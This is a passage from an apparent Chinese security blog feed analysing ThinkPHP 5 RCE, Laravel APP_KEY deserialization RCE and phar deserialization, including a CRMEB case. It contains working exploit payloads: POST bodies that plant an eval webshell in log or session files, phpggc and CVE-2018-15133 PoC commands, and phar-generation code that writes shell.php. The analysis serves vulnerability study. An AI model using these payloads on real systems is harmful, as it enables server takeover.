variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token punctuation">}</span></code></pre><p>当匹配到exp的时候，就会在exp后面添加一个空格，导致不能同parseKey方法中的exp相等。同样，利用insert方法向数据库插入数据也是同种原理。由于篇幅问题，网上的分析文章也多，之后的注入不想再造轮子了，可以详细看这个师傅的文章：<a href="https://github.com/Mochazz/ThinkPHP-Vuln。" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln。</a></p><h4 id="TP5-rce漏洞"><a href="#TP5-rce漏洞" class="headerlink" title="TP5 rce漏洞"></a><strong>TP5 rce漏洞</strong></h4><p>TP5的rce漏洞影响版本：ThinkPHP 5.0.x ~ 5.0.23、ThinkPHP 5.1.x ~ 5.1.31、ThinkPHP 5.2.0beta1</p><p>TP5rce的分析网上也比较多了，我这里有也不造轮子了，主要说下在TP渗透，php7版本的关于log文件和session文件包含的问题。</p><h5 id="runtime文件包含拿shell"><a href="#runtime文件包含拿shell" class="headerlink" title="runtime文件包含拿shell"></a><strong>runtime文件包含拿shell</strong></h5><p>先写入一句话到runtime日志中，POST发送</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre><p>runtime的日志文件为./runtime/log/202008/17.log</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202008/17.log&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/19.png" alt="" loading="lazy"></p><h5 id="session文件包含拿shell"><a href="#session文件包含拿shell" class="headerlink" title="session文件包含拿shell"></a><strong>session文件包含拿shell</strong></h5><p>写入session文件</p><pre><code>_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&amp;server[]=1</code></pre><p>一般linux下的session文件存储在/var/lib/php/session，session的命名为sess_[PHPSESSID]</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/var/lib/php/session/sess_sf9vlodcl4j4r1bhli2ddnvr32&amp;server[]=1&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/20.png" alt="" loading="lazy"></p><p>其实也可以用反序列化的点来，只是有点麻烦，需要去调代码。</p><pre><code>_method=__construct&amp;filter=unserialize&amp;method=get&amp;server[REQUEST_METHOD]=序列化</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h4><p>反序列化点通常都是在代码审计当中被发现的，当unserialize可控时可以触发，但是只光靠unserialize可控很难找到可控点，这时安全研究员<strong>Sam Thomas</strong>分享了一个关于phar反序列的漏洞，大大增加了反序列化的利用点。由于TP5-6的反序列化分析篇幅比较大，可以直接看我博客：</p><p>Thinkphp5.0.24反序列：<a href="https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>Thinkphp5.1.x反序列：<a href="https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x反序列化链分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p>Thinkphp6.x反序列：<a href="https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>phar反序列化挖掘案列：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Runtime日志&quot;&gt;&lt;a href=&quot;#Runtime日志&quot; class=&quot;headerlink&quot; title=&quot;Runtime日志&quot;&gt;&lt;/a&gt;&lt;strong&gt;Runtime日志&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在ThinkPHP3的版本中，入口文件index.
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel APP_KEY泄露 RCE漏洞分析</title>
    <link href="http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2020-08-14T10:46:06.146Z</updated>
    
    <content type="html"><![CDATA[<p>laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：<strong>5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29</strong></p><h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a><strong>环境安装</strong></h4><pre><code>composer create-project laravel/laravel laravel5629 --prefer-dist &quot;5.6.0&quot;修改composer.json中的5.6.0为5.6.29更新：composer update在routes/web.php新添加一条路由：Route::post(&#39;/&#39;, function() {return view(&#39;welcome&#39;);});</code></pre><h4 id="通过Cookie反序列化"><a href="#通过Cookie反序列化" class="headerlink" title="通过Cookie反序列化"></a><strong>通过Cookie反序列化</strong></h4><p>跟踪代码app\Http\Middleware\EncryptCookies.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>EncryptCookies</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">EncryptCookies</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪EncryptCookies的父类，vendor\laravel\framework\src\Illuminate\Cookie\Middleware\EncryptCookies.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进decrypt方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isDisabled</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DecryptException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$request</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里$request-&gt;cookies进行了遍历，将值传入了decryptCookie方法。继续跟进decryptCookie方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptArray</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encrypter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面判断我们传入的是否为数组，不为数组进入到decrypt，跟进vendor\laravel\framework\src\Illuminate\Encryption\Encrypter.php的decrypt方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/1.png" alt="" loading="lazy"></p><p>跟进getJsonPayload方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getJsonPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The payload is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validMac</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The MAC is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们传入的payload会解密base64，再转化为json，所以这个iv和value是我们可控的，最终就可以来到第149行进行反序列化操作了。</p><h4 id="通过X-XSRF-TOKEN头反序列化"><a href="#通过X-XSRF-TOKEN头反序列化" class="headerlink" title="通过X-XSRF-TOKEN头反序列化"></a><strong>通过X-XSRF-TOKEN头反序列化</strong></h4><p>跟踪代码app\Http\Middleware\VerifyCsrfToken.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>VerifyCsrfToken</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">VerifyCsrfToken</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪VerifyCsrfToken的父类，vendor\laravel\framework\src\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isReading</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">runningUnitTests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">inExceptArray</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addCookieToResponse</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TokenMismatchException</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>继续更进tokensMatch方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进getTokenFromRequest方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/2.png" alt="" loading="lazy"></p><p>第140行获取头X-XSRF-TOKEN，又来到熟悉的地方了，更新decrypt方法，跟cookie造成的洞是同一个点。</p><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><p>获取APP_KEY，在根目录.env文件里</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/3.png" alt="" loading="lazy"></p><p>用<a href="https://github.com/ambionics/phpggc" target="_blank" rel="noopener">phpggc</a>获取laravel的反序列化的exp</p><pre><code>php phpggc Laravel/RCE1 system &quot;ipconfig&quot; -b</code></pre><p>利用kozmic的poc生成laravel rce的利用代码</p><pre><code>php cve-2018-15133.php yyEsCy8SJCpScYkcEBvrRVHv9MDV43MliNS/4ETRJaw= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjg6ImlwY29uZmlnIjt9</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/4.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/5.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://xz.aliyun.com/t/6533" target="_blank" rel="noopener">https://xz.aliyun.com/t/6533</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：&lt;strong&gt;5.5.x&amp;lt;=5.5.40、5.6.x&amp;lt;=5.6.29&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&quot;环境安装&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>phar反序列化漏洞挖掘</title>
    <link href="http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    <id>http://yoursite.com/2020/07/22/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</id>
    <published>2020-07-21T16:00:00.000Z</published>
    <updated>2020-08-17T09:38:05.541Z</updated>
    
    <content type="html"><![CDATA[<h4 id="phar的结构"><a href="#phar的结构" class="headerlink" title="phar的结构"></a><strong>phar的结构</strong></h4><ol><li>a stub是一个文件标志，格式为 ：<code>xxx&lt;?php xxx;__HALT_COMPILER();?&gt;</code>。</li><li>manifest是被压缩的文件的属性等放在这里，这部分是以序列化存储的，是主要的攻击点。</li><li>contents是被压缩的内容。</li><li><code>signature</code> 签名，放在文件末尾。</li></ol><h4 id="受影响函数"><a href="#受影响函数" class="headerlink" title="受影响函数"></a><strong>受影响函数</strong></h4><table><thead><tr><th align="center">fileatime</th><th align="center">filectime</th><th align="center">file_exists</th><th align="center">file_get_contents</th></tr></thead><tbody><tr><td align="center">file_put_contents</td><td align="center">file</td><td align="center">filegroup</td><td align="center">fopen</td></tr><tr><td align="center">fileinode</td><td align="center">filemtime</td><td align="center">fileowner</td><td align="center">fileperms</td></tr><tr><td align="center">is_dir</td><td align="center">is_executable</td><td align="center">is_file</td><td align="center">is_link</td></tr><tr><td align="center">is_readable</td><td align="center">is_writeable</td><td align="center">parse_ini_file</td><td align="center">copy</td></tr><tr><td align="center">unlink</td><td align="center">stat</td><td align="center">is_writable</td><td align="center">readfile</td></tr></tbody></table><h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h4><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar反序列化可以不用unserialize函数的可控，只需要满足上面的危险函数可控，大大增加了反序列化漏洞的挖掘。这里，利用以下代码生成phar文件：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"GIF89a"</span><span class="token punctuation">.</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//设置stub</span>    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//将自定义meta-data存入manifest</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"test.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//添加要压缩的文件</span>    <span class="token comment" spellcheck="true">//签名自动计算</span>    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>phar文件是通过stub来标识的，是通过<code>xxx&lt;?php xxx.__HALT_COMPILER(); ?&gt;</code>来判断的，所以对后缀并没有要求，修改成gif，通过图片的上传点，上传到目标服务器，在利用phar://协议执行pahr文件。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/1.png" alt="" loading="lazy"></p><p>在php.ini中需要设置phar.readonly为off，不是无法生成phar文件</p><pre><code>phar.readonly = off</code></pre><h4 id="CRMEB系统phar反序列化"><a href="#CRMEB系统phar反序列化" class="headerlink" title="CRMEB系统phar反序列化"></a><strong>CRMEB系统phar反序列化</strong></h4><p>CRMEB是基于THINKPHP6.0开发的，tp6.0的反序列化链在前面的文章分析过，利用pop链生成php文件。由于是后台反序列化也只能供学习。在crmeb\app\admin\controller\system\SystemFile.php下的openfile方法中的file参数可控。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/2.png" alt="" loading="lazy"></p><p>第66行将file赋值给了filepath变量，然后跟进67的read_file方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/3.png" alt="" loading="lazy"></p><p>这里$file可控，且存在执行phar反序列化的危险函数，同时这里也可以任意文件读取</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/3/4.png" alt="" loading="lazy"></p><p>生成phar文件，执行tp6.0反序列化漏洞，exp如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$autosave</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$cache</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"shell"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"&lt;?php phpinfo();?>"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage</span><span class="token punctuation">{</span>    <span class="token keyword">use</span> <span class="token package">League<span class="token punctuation">\</span>Flysystem<span class="token punctuation">\</span>Cached<span class="token punctuation">\</span>Storage<span class="token punctuation">\</span>AbstractCache</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">Adapter</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractCache</span>    <span class="token punctuation">{</span>        <span class="token keyword">protected</span> <span class="token variable">$file</span><span class="token punctuation">;</span>        <span class="token keyword">protected</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$adapter</span><span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string">"./public/shell.php"</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">adapter</span> <span class="token operator">=</span> <span class="token variable">$adapter</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token 